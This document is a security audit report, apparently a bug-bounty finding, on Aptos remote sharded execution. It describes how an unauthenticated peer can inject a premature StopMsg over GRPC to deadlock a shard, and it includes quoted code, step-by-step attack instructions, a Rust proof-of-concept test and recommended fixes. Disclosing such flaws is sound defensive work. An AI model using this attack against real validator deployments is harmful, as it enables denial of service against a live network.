# Audit Report

## Title
Unauthenticated Cross-Shard Message Injection Enables Liveness Denial via Premature StopMsg

## Summary
The remote cross-shard messaging system lacks authentication and message variant validation, allowing any network peer to send arbitrary `CrossShardMsg` enum variants to any shard. A malicious actor can send a premature `StopMsg` to terminate the `CrossShardCommitReceiver` before execution completes, causing permanent deadlock of the affected shard.

## Finding Description

The security question asks whether BCS deserialization can be exploited to cause type confusion. While BCS itself is type-safe and will correctly deserialize to whatever variant is encoded in the bytes, the critical vulnerability lies in the **complete absence of message authentication and variant validation**.

### Architecture Overview

The sharded execution system uses cross-shard messaging where:
1. Each shard runs a `CrossShardCommitReceiver` thread that processes incoming messages in a loop
2. Messages are serialized as `CrossShardMsg` enum with two variants: `RemoteTxnWriteMsg` (carrying state updates) and `StopMsg` (termination signal)
3. The receiver processes `RemoteTxnWriteMsg` to update the `CrossShardStateView`, and stops when receiving `StopMsg` [1](#0-0) 

### Deserialization Without Validation

The `receive_cross_shard_msg` function deserializes incoming bytes without any authentication or variant validation: [2](#0-1) 

### Message Processing Loop

The `CrossShardCommitReceiver::start` method processes messages in an infinite loop, stopping only when `StopMsg` is received: [3](#0-2) 

### Expected Flow

In normal operation, after block execution completes, the shard sends itself a `StopMsg` to terminate the receiver: [4](#0-3) 

### No Network Authentication

The underlying `NetworkController` uses GRPC without authentication. Any network peer can send messages: [5](#0-4) 

### Attack Execution Path

**Step 1**: Attacker identifies target shard's socket address from network configuration

**Step 2**: Attacker establishes GRPC connection to target shard (no authentication required)

**Step 3**: Attacker crafts and sends a malicious `StopMsg`:
```rust
let malicious_msg = CrossShardMsg::StopMsg;
let serialized = bcs::to_bytes(&malicious_msg).unwrap();
// Send via GRPC to target shard's cross_shard_{round} channel
```

**Step 4**: The target shard's `CrossShardCommitReceiver` receives and processes the `StopMsg`, breaking out of its message processing loop prematurely

**Step 5**: Legitimate `RemoteTxnWriteMsg` messages that arrive later are never processed

**Step 6**: Transactions on this shard that depend on those cross-shard state values call `get_state_value`, which blocks forever waiting for values that will never be set: [6](#0-5) 

### Broken Invariants

1. **Total loss of liveness**: The affected shard becomes permanently deadlocked, unable to complete block execution
2. **Deterministic execution**: If different shards experience different message injection attacks, they may produce different results, breaking consensus

## Impact Explanation

**Severity: CRITICAL** (per Aptos Bug Bounty criteria)

This vulnerability enables **"Total loss of liveness/network availability"** which is explicitly listed as Critical severity worth up to $1,000,000.

**Specific impacts:**
- **Complete shard deadlock**: The attacked shard cannot complete execution and hangs indefinitely
- **Cascading failure**: Since sharded execution requires all shards to complete, one deadlocked shard causes the entire parallel execution to fail
- **No recovery mechanism**: The deadlock is permanent; the only recovery is to restart the entire execution service
- **Consensus impact**: If this occurs during block execution, the validator cannot produce the block, affecting network liveness

The attack requires no insider access, no stake, and minimal technical sophistication—just network access and the ability to craft a simple BCS-encoded message.

## Likelihood Explanation

**Likelihood: HIGH**

**Factors increasing likelihood:**
1. **Zero authentication**: No cryptographic verification of message sender
2. **Network exposure**: Executor services with remote shards are exposed on the network
3. **Simple exploit**: Requires only basic understanding of BCS encoding and network access
4. **No rate limiting**: No protection against repeated attacks

**Factors decreasing likelihood:**
1. **Limited deployment**: Remote sharded execution may not be deployed in production yet
2. **Network segmentation**: Production deployments may use private networks

However, given the complete absence of authentication, any deployment that uses remote sharded execution is vulnerable.

## Recommendation

Implement comprehensive security controls for cross-shard messaging:

**1. Message Authentication with Digital Signatures:**
```rust
pub struct AuthenticatedCrossShardMsg {
    msg: CrossShardMsg,
    sender_shard_id: ShardId,
    round: RoundId,
    signature: Signature,
}

impl CrossShardClient for RemoteCrossShardClient {
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        
        // Deserialize authenticated message
        let auth_msg: AuthenticatedCrossShardMsg = 
            bcs::from_bytes(&message.to_bytes()).unwrap();
        
        // Verify signature using sender's public key
        verify_signature(
            &auth_msg.msg, 
            &auth_msg.sender_shard_id,
            &auth_msg.signature
        ).expect("Invalid signature");
        
        // Validate message variant for current context
        validate_message_variant(&auth_msg.msg, current_round);
        
        auth_msg.msg
    }
}
```

**2. Message Variant Validation:**
```rust
fn validate_message_variant(msg: &CrossShardMsg, round: RoundId) {
    match msg {
        CrossShardMsg::StopMsg => {
            // Only accept StopMsg from self (local shard)
            // Reject StopMsg from remote shards
        },
        CrossShardMsg::RemoteTxnWriteMsg(_) => {
            // Validate state_key is in expected set
            // Validate write_op is structurally valid
        }
    }
}
```

**3. TLS/mTLS for Network Layer:**
Use mutual TLS authentication in the NetworkController to ensure only authorized shards can connect.

**4. State Key Validation:**
Modify `CrossShardStateView::set_value` to return `Result` instead of panicking:
```rust
pub fn set_value(&self, state_key: &StateKey, state_value: Option<StateValue>) 
    -> Result<(), Error> {
    self.cross_shard_data
        .get(state_key)
        .ok_or(Error::UnexpectedStateKey)?
        .set_value(state_value);
    Ok(())
}
```

## Proof of Concept

```rust
#[test]
fn test_premature_stop_msg_deadlock() {
    use aptos_types::block_executor::partitioner::{ShardId, RoundId};
    use aptos_vm::sharded_block_executor::messages::CrossShardMsg;
    use std::net::SocketAddr;
    use std::sync::Arc;
    
    // Setup: Create two shards
    let shard0_addr: SocketAddr = "127.0.0.1:8000".parse().unwrap();
    let shard1_addr: SocketAddr = "127.0.0.1:8001".parse().unwrap();
    
    // Shard 0 expects cross-shard data from Shard 1
    let mut network_controller0 = NetworkController::new(
        "shard0".to_string(), 
        shard0_addr, 
        5000
    );
    
    let cross_shard_client0 = Arc::new(RemoteCrossShardClient::new(
        &mut network_controller0,
        vec![shard1_addr],
    ));
    
    network_controller0.start();
    
    // Setup Shard 1 as attacker
    let mut network_controller1 = NetworkController::new(
        "shard1_attacker".to_string(),
        shard1_addr,
        5000
    );
    
    let attacker_client = Arc::new(RemoteCrossShardClient::new(
        &mut network_controller1,
        vec![shard0_addr],
    ));
    
    network_controller1.start();
    
    // Start receiver on Shard 0
    let receiver_handle = std::thread::spawn(move || {
        // This will receive messages for round 0
        let msg = cross_shard_client0.receive_cross_shard_msg(0);
        msg
    });
    
    // Attack: Shard 1 sends premature StopMsg to Shard 0
    std::thread::sleep(std::time::Duration::from_millis(100));
    attacker_client.send_cross_shard_msg(
        0,  // target shard 0
        0,  // round 0
        CrossShardMsg::StopMsg
    );
    
    // Shard 0's receiver exits prematurely
    let received_msg = receiver_handle.join().unwrap();
    assert!(matches!(received_msg, CrossShardMsg::StopMsg));
    
    // Now if legitimate RemoteTxnWriteMsg arrives, it won't be processed
    // Any transaction waiting for that state value will deadlock forever
    
    // Cleanup
    network_controller0.shutdown();
    network_controller1.shutdown();
}
```

**Expected behavior**: The test demonstrates that an unauthenticated shard can send a premature `StopMsg`, causing the receiver to exit before processing legitimate messages, resulting in deadlock for transactions waiting on cross-shard state.

### Citations

**File:** aptos-move/aptos-vm/src/sharded_block_executor/messages.rs (L7-11)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum CrossShardMsg {
    RemoteTxnWriteMsg(RemoteTxnWrite),
    StopMsg,
}
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L26-45)
```rust
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L157-168)
```rust
                if let Some(shard_id) = shard_id {
                    trace!(
                        "executed sub block for shard {} and round {}",
                        shard_id,
                        round
                    );
                    // Send a self message to stop the cross-shard commit receiver.
                    cross_shard_client_clone.send_cross_shard_msg(
                        shard_id,
                        round,
                        CrossShardMsg::StopMsg,
                    );
```

**File:** secure/net/src/grpc_network_service/mod.rs (L92-115)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/remote_state_value.rs (L29-39)
```rust
    pub fn get_value(&self) -> Option<StateValue> {
        let (lock, cvar) = &*self.value_condition;
        let mut status = lock.lock().unwrap();
        while let RemoteValueStatus::Waiting = *status {
            status = cvar.wait(status).unwrap();
        }
        match &*status {
            RemoteValueStatus::Ready(value) => value.clone(),
            RemoteValueStatus::Waiting => unreachable!(),
        }
    }
```
